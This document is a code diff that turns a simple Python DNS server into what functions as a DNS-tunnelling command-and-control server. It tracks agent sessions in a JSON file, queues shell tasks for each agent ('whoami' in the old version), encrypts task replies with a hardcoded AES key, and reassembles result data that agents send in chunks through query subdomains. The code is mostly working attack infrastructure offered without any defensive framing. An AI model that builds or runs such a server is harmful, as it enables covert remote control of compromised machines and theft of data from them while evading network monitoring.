@@ -1,138 +1,238 @@
-import threading
 import time
+import json
 import base64
-import os
-from dnslib.server import DNSServer, BaseResolver
+import random
+import datetime
+import threading
+
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
 from dnslib import DNSRecord, QTYPE, RR, TXT
+from dnslib.server import DNSServer, BaseResolver
 
-# task.domain.local
-# data.result.domain.local
-# <total_parts>.<uuid>.loadstart.domain.local
-# <data>.<part_n>.<uuid>.load.domain.local
-# <uuid>.loadend.domain.local
+NO_TASK_RESPONSE = "[NOTHING]"
+SESSIONS_DATA = "./sessions.json"
 
-
-BASE_DOMAIN = 'domain.local'
-OUTPUT_DIR = './dns_fragments'
-
-FRAGMENT_TTL = 300 
-CLEANUP_INTERVAL = 30
-MAX_PARTS = 500
-MAX_TOTAL_BYTES = 10_000_000
-MAX_LABEL = 63
-
-SERVER_ADDRESS = '0.0.0.0'
 SERVER_PORT = 5353
-EXPECTED_DOMAIN = 'domain.local'
-SERVER_TTL=60
+SERVER_ADDRESS = "0.0.0.0"
+EXPECTED_DOMAIN = "domain.local"
 
-TASK_OP = 'task'
-RESULT_OP = 'result'
-LOADSTART_OP = 'loadstart'
-LOADEND_OP = 'loadend'
-LOAD_OP = 'load'
+CLEANUP_INTERVAL = 30
 
-MIN_LABEL = 1
+AES_KEY = b"0123456789abcdef"
+IV_SIZE=16
 
-ENABLED_OPS = (TASK_OP, RESULT_OP, LOADSTART_OP, LOADEND_OP, LOAD_OP)
+NO_TASK_RESPONSE = "[NOTHING]"
 
-LOADS = {}
+def read_json_file(file_path):
+    try:
+        with open(file_path, 'r', encoding='utf-8') as file:
+            data = json.load(file)
+            return data
+    except FileNotFoundError:
+        print(f"Error: File Not Found: '{file_path}'")
+        return None
+    except json.JSONDecodeError:
+        print(f"Error: Unable to decode JSON File: '{file_path}'.")
+        return None
 
-os.makedirs(OUTPUT_DIR, exist_ok=True)
-
-def parse_multipart(labels, op):
-    uuid = labels[-1]
-    part_or_total = None
-    load_data = None
-
-    if op in (LOADSTART_OP, LOAD_OP):
-        part_or_total = labels[-2]
-
-        if op == LOAD_OP:
-            load_data = labels[:-2]
+def write_in_json(file_path, data):
+    with open(file_path, 'w', encoding='utf-8') as file:
+        json.dump(data, file, ensure_ascii=False, indent=4)
 
 
+def is_json(data: str) -> bool:
+    try:
+        json.loads(data)
+        return True
+    except json.JSONDecodeError:
+        return False
 
-    return uuid, part_or_total, load_data
+def b64_encode(data_bytes: bytes):
+    return base64.urlsafe_b64encode(data_bytes).rstrip(b"=").decode()
+
+def b64_decode(s: str) -> bytes:
+    padding = '=' * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s + padding)
+
+def decrypt_data(key: bytes, iv_ct: bytes) -> bytes:
+    if len(iv_ct) < 16:
+        raise ValueError("iv_ct demasiado corto")
+    iv = iv_ct[:16]
+    ct = iv_ct[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(ct), AES.block_size)
+
+def encrypt_data(key:bytes, data:bytes):
+    encoded_json = json.dumps(data, separators=(",",":"), ensure_ascii=False).encode()
+    iv = get_random_bytes(IV_SIZE)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphered = cipher.encrypt(pad(data, AES.block_size))
+
+    iv_padded = iv+ciphered
+    formated_data = b64_encode(iv_padded)
+
+    return formated_data
+
+def encrypt_string(key: bytes, plaintext: str) -> str:
+
+    if not isinstance(plaintext, str):
+        raise TypeError("plaintext debe ser string")
+    
+    data = plaintext.encode("utf-8")
+    iv = get_random_bytes(IV_SIZE)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphered = cipher.encrypt(pad(data, AES.block_size))
+    encrypted_blob = iv + ciphered
+    return b64_encode(encrypted_blob)
+
+def update_callback(agent_id):
+    SESSIONS = read_json_file(SESSIONS_DATA)
+    if agent_id not in SESSIONS:
+        agent_session = {
+            "pending_tasks": [],
+            "messages": {},
+            "last_time": ''
+        }
+
+        SESSIONS[agent_id] = agent_session
+
+    now_dt = datetime.datetime.now()
+    now_dt_iso = now_dt.strftime("%Y-%m-%d %H:%M:%S") 
+
+    SESSIONS[agent_id]["last_time"] = now_dt_iso
+    write_in_json(SESSIONS_DATA, SESSIONS)
+
+def get_task(agent_id):
+    SESSIONS = read_json_file(SESSIONS_DATA)
+    pending_tasks = SESSIONS[agent_id]["pending_tasks"]
+
+    if len(pending_tasks) == 0:
+        return NO_TASK_RESPONSE
+
+    current_task = pending_tasks[0]
+    SESSIONS[agent_id]["pending_tasks"].pop(0)
+    write_in_json(SESSIONS_DATA, SESSIONS)
 
 
-def get_task():
-    return 'whoami'
+    return current_task
 
-def save_result(data):
-    joined_data = ''.join(data)
-    decoded_string = decode_b64(joined_data)
-    return decoded_string
+def init_message(agent_id, message_id, task):
 
-def init_multipart(labels):
-    uuid, total_parts, _ = parse_multipart(labels, LOADSTART_OP)
-    LOADS[uuid] = { 'total': total_parts, 'current': None, 'data':[]}
-    return 'START'
+    message_data = {
+        "task": task,
+        "chunks": {},
+        "loaded_size": 0,
+        "load_size": 0,
+        "data": ""
+    }
 
-def save_part(labels):
-    uuid, part_number, load_data = parse_multipart(labels, LOAD_OP)
-    part_idx = int(part_number)
+    SESSIONS = read_json_file(SESSIONS_DATA)
+    SESSIONS[agent_id]["messages"][message_id] = message_data
 
-    LOADS[uuid]['data'].extend(load_data)
-    LOADS[uuid]['current'] = part_idx
-    return 'NEXT'
+    write_in_json(SESSIONS_DATA, SESSIONS)
 
-def str_to_chunks(data: str, chunk_size: int = 255) -> list[str]:
-    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+    return True
 
-def decode_b64(encoded):
-    b64_bytes = encoded.encode('utf-8')
-    decoded_bytes = base64.b64decode(b64_bytes)
-    decoded_string = decoded_bytes.decode('utf-8')
+def take_callback(agent_id):
+    update_callback(agent_id)
+    current_task = get_task(agent_id)
 
-    return decoded_string
+    SESSIONS = read_json_file(SESSIONS_DATA)
 
-def end_multipart(labels):
-    uuid, *_ = parse_multipart(labels, LOADEND_OP)
-    loaded_data = LOADS[uuid]['data']
-    del LOADS[uuid]
-    joined_data = ''.join(loaded_data)
+    formated_response = current_task
 
-    plain_string = decode_b64(joined_data)
-    print(f'\n result:\n {plain_string} \n\n')
-    return plain_string
+    if current_task != NO_TASK_RESPONSE:
+        message_id = random.randint(1, 1_000_000)
+        formated_response = f"{str(message_id)}:{current_task}"
+        init_message(agent_id, message_id, current_task)
 
+    encoded_task = encrypt_string(AES_KEY, formated_response)
 
-OPERATIONS = {
-    TASK_OP: get_task,
-    RESULT_OP: save_result,
-    LOADSTART_OP: init_multipart,
-    LOAD_OP: save_part,
-    LOADEND_OP: end_multipart
-}
+    return encoded_task
+
+def assemble_data(message_data):
+    chunks = message_data["chunks"]
+    sorted_indexes = sorted(chunks.keys(), key=int)
+    assembled_b64 = ''.join(chunks[i] for i in sorted_indexes)
+    decoded_data = b64_decode(assembled_b64).decode()
+
+    return decoded_data
+
+def take_chunk(data):
+    response = encrypt_string(AES_KEY, "[NEXT]")
+    SESSIONS = read_json_file(SESSIONS_DATA)
+    chunk = json.loads(data)
+
+    agent_id = chunk["agent_id"]
+    message_id = str(chunk["message_id"])
+    chunk_index = str(chunk["chunk_index"])
+    chunk_data = chunk["data"]
+    chunk_size = len(chunk_data)
+
+    agent_session = SESSIONS[agent_id]
+    message_data = agent_session["messages"][message_id]
+    
+    if message_data["load_size"] == 0:
+        message_data["load_size"] = chunk["size"]
+
+    message_data["chunks"][chunk_index] = chunk_data
+    message_data["loaded_size"] = message_data["loaded_size"] + chunk_size
+
+    is_completed = message_data["loaded_size"] == message_data["load_size"]
+
+    if is_completed:
+        assembled_data = assemble_data(message_data)
+        message_data["data"] = assemble_data(message_data)
+        del message_data["chunks"]
+        del message_data["loaded_size"]
+        del message_data["load_size"]
+
+    agent_session["messages"][message_id] = message_data
+    SESSIONS[agent_id] = agent_session
+
+    write_in_json(SESSIONS_DATA, SESSIONS)
+    update_callback(agent_id)
+
+    return response
+
+    
+def decode_fqdn(head):
+    try:
+        decoded_head = b64_decode(head)
+        decrypted_data = decrypt_data(AES_KEY, decoded_head).decode()
+        return decrypted_data
+    except Exception as e:
+        print(f"[!] Error decoding fqdn head: ", e)
+        return None
+
+def handle(head):
+    decrypted_data = decode_fqdn(head)
+    is_callback = not is_json(decrypted_data)
+
+    response = ""
+
+    if is_callback:
+        response = take_callback(decrypted_data)
+    else: 
+        response = take_chunk(decrypted_data)
+
+    return response
 
 def check_request(qname):
     if not qname.endswith(EXPECTED_DOMAIN):
-        return False, None
+        return False, ""
 
-    sub_qname = qname.removesuffix(f'.{EXPECTED_DOMAIN}')
-    labels = sub_qname.split('.')
+    suffix = f".{EXPECTED_DOMAIN}"
+    clear_qname = qname.removesuffix(suffix)
+    splitted_qname = clear_qname.split(".")
+    fqdn = "".join(splitted_qname)
 
-    if len(labels) < MIN_LABEL:
-        return False, None
+    return True, fqdn
 
-    if labels[-1] not in ENABLED_OPS:
-        return False, None
-
-    op = labels[-1]
-    len_labels = len(labels)
-
-    if op in (RESULT_OP, LOADEND_OP)  and len_labels != 2:
-        return False, None
-
-    if op == LOADSTART_OP and len_labels != 3:
-        return False, None
-
-    if op == LOAD_OP and len_labels < 4:
-        return False, None
-
-
-    return True, labels
+def str_to_chunks(data: str, chunk_size: int = 255) -> list[str]:
+    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
 
 class DNSResolver(BaseResolver):
     def __init__(self):
@@ -147,24 +247,16 @@ class DNSResolver(BaseResolver):
         qname = str(q.qname).rstrip('.')
         reply = request.reply()
 
-        check, labels = check_request(qname)
+        is_valid_request, fqdn = check_request(qname)
 
-        if not check:
-            reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(str_to_chunks('IGNORED'))))
+        if not is_valid_request:
+            reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(["PONG"])))
             return reply
 
-        op = labels[-1]
-        
-        func = OPERATIONS.get(op)
-        txt_response = ''
+        raw_response = handle(fqdn)
+        chunked_response = str_to_chunks(raw_response)
 
-        if op == TASK_OP:
-            txt_response = func()
-        else:
-            labels.pop()
-            txt_response = func(labels)
-
-        reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(str_to_chunks(txt_response))))
+        reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(chunked_response)))
         return reply
 
     def _cleanup_loop(self):
@@ -180,11 +272,12 @@ class DNSResolver(BaseResolver):
         self._stop = True
         self._cleaner.join(timeout=1)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     resolver = DNSResolver()
-
     server = DNSServer(resolver, port=SERVER_PORT, address=SERVER_ADDRESS, logger=None)
+
     server.start_thread()
+
     try:
         while True:
             time.sleep(1)
